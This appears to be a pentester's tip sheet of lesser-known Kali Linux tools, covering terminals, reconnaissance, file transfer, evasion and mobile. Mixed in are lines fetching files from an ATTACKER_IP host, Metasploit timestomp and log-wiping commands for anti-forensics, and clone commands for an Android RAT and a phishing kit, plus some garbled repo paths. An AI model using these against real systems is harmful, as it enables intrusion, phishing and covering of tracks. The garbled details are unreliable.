# Hidden Gems - Lesser Known Tools & Tips

## 🔐 Stealth & Anonymity

### 1. Kali Undercover Mode
**What:** Instantly changes Kali to look like Windows 10/11
```bash
kali-undercover
```
**Why:** Hide in public, looks like normal PC

### 2. Ghostery
**What:** Browser with built-in privacy
- Blocks trackers
- Randomizes fingerprints
- Built-in VPN

### 3. MacChanger
**What:** Spoof MAC address
```bash
macchanger -r wlan0  # Random MAC
macchanger -m XX:XX:XX:XX:XX:XX wlan0  # Specific MAC
```

---

## 🎨 Terminal & UI

### 1. Ghostty ⭐ (RECOMMENDED)
**What:** Fast, GPU-accelerated terminal
- **Why:** Blazing fast, beautiful, tabs/splits
- **Install:**
```bash
# Download from https://ghostty.org/download
# Or:
sudo apt install ghostty
```
**Verdict:** Nice to have, not needed. Kali's default terminal works fine.

### 2. Tilix
**What:** Terminal with split panes
```bash
sudo apt install tilix
```
**Why:** Work on multiple terminals in one window

### 3. Zsh + Oh-My-Zsh
**What:** Better shell with plugins
```bash
# Install
sudo apt install zsh
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"

# Useful plugins
plugins=(git docker pip kubectl)
```
**Verdict:** ✅ RECOMMENDED - Makes terminal much better

### 4. Tmux (Already included)
**What:** Terminal multiplexer
```bash
# Basic usage
tmux new -s pentest
# Ctrl+b then d to detach
tmux attach -t pentest
```
**Verdict:** ✅ MUST HAVE - Run multiple sessions

---

## 🔍 Reconnaissance

### 1. SpiderFoot
**What:** Automated OSINT
```bash
# Install
pip3 install spiderfoot
sf.py -s target.com
```
**Why:** Gather all public info about target

### 2. Photon
**What:** Super fast web scraper
```bash
git clone https://github.com/s0md3v/Photon.git
python3 photon.py -u target.com
```

### 3. CyberChef
**What:** Browser-based data processing
```bash
# Already in Kali
# Or download:
curl -L "https://github.com/matthewhiggins17/cyberchef/releases/latest/download/CyberChef_enveloped.html" -o /usr/share/cyberchef.html
# Open in browser
```

---

## 🛡️ Detection & Forensics

### 1. LinPEAS / WinPEAS
**What:** Privilege escalation checker
```bash
# Already downloaded by our scripts
/opt/linpeas.sh
```

### 2. Chkrootkit
**What:** Check for rootkits
```bash
sudo apt install chkrootkit
sudo chkrootkit
```

### 3. Rkhunter
**What:** Rootkit hunter
```bash
sudo apt install rkhunter
sudo rkhunter --check
```

### 4. Logtop
**What:** Real-time log analyzer
```bash
sudo apt install logtop
tail -f /var/log/syslog | logtop
```

---

## 🔧 File Transfer

### 1. SimpleHTTPServer (Python)
```bash
# On attacker machine
python3 -m http.server 8000

# On target
wget http://ATTACKER_IP:8000/file
curl http://ATTACKER_IP:8000/file -o file
```

### 2. SCP
```bash
# Copy from target to Kali
scp user@target:/path/file .

# Copy to target
scp file user@target:/path/
```

### 3. Netcat
```bash
# Send file
nc -w 3 target_ip 1234 < file.txt

# Receive file
nc -l -p 1234 > file.txt
```

### 4. SSHFS
```bash
sudo apt install sshfs
sshfs user@target:/remote /local/mount
```

---

## 🎭 Evasion & Clean Exit

### 1. Kill Switch VPN Script
**What:** Auto-disconnect if VPN drops
```bash
# In our scripts: kali-stealth/kill-switch.sh
```

### 2. Timestomp (Metasploit)
```bash
# In meterpreter:
timestomp file.txt -m "01/01/2020 10:10:10"
timestomp file.txt -c "01/01/2020 10:10:10"
timestomp file.txt -a "01/01/2020 10:10:10"
```

### 3. Covermyass
**What:** Clean Linux logs
```bash
git clone https://github.com/salimkinz/covermyass.git
python3 covermyass.py
```

---

## 📱 Mobile

### 1. Termux (on phone)
Already covered in our guides

### 2. AndroRAT
**What:** Android remote access tool
```bash
git clone https://github.com/k korti/AndroRAT.git
```

### 3. Shellphish
**What:** Phishing for social media
```bash
git clone https://github.com/thelinuxchoice/shellphish.git
```

---

## 🧠 AI Tools

### 1. HexStrike AI ⭐
**What:** 150+ pentest tools via AI
- Already in our setup!

### 2. Gemini CLI
**What:** Free AI assistant in Kali
```bash
gemini --prompt "help with nmap scan"
```

### 3. OpenCode
**What:** AI coding assistant
```bash
opencode
```

---

## Quick Install Script

```bash
# Install all recommended extras
sudo apt install tilix zsh macchanger chkrootkit rkhunter netcat-openbsd sshfs

# Install Oh-My-Zsh
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"
```

---

## Summary

| Tool | Need? | Why |
|------|-------|-----|
| Ghostty | ❌ Optional | Nice but not needed |
| Tilix | ✅ Nice to have | Better terminal splits |
| Zsh + Oh-My-Zsh | ✅ RECOMMENDED | Much better shell |
| Tmux | ✅ MUST HAVE | Already included! |
| MacChanger | ✅ MUST HAVE | Hide your MAC |
| SpiderFoot | ✅ RECOMMENDED | OSINT |
| LinPEAS | ✅ MUST HAVE | Already have it |
| Chkrootkit | ✅ Nice to have | Check for rootkits |

---

## What NOT to Install

- ❌ Too many tools at once
- ❌ Tools you don't understand
- ❌ Complex frameworks (yet)
- ❌ GUI tools (suck RAM)
